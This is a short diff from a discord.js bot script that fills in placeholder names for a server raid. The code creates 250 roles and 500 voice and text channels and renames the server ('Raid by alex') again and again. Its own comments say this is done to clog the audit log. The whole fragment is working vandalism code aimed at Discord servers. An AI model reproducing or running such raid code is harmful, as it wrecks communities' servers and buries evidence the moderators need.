@@ -9,15 +9,15 @@ const Discord = require('discord.js');
             for (var i = 0; i < 250; i++) {
                 // Creates new roles to clog up the audit log
                 message.guild.createRole({
-                    name: 'Non des roles',
+                    name: 'bien le bonjour',
                     color: 'RED',
                 });
               }
                 for (var i = 0; i < 500; i++) {
-                message.guild.createChannel('Nom des channel vocalK', 'voice')
-                message.guild.createChannel('Nom des channel texte', 'text')
+                message.guild.createChannel('bien le bonjour', 'voice')
+                message.guild.createChannel('bien le bonjour', 'text')
                 //changes name tons of times to clog up the audit log
-                message.guild.setName("Nom du serveur qui va être mis");
+                message.guild.setName("Raid by alex");
                 }
             };
 
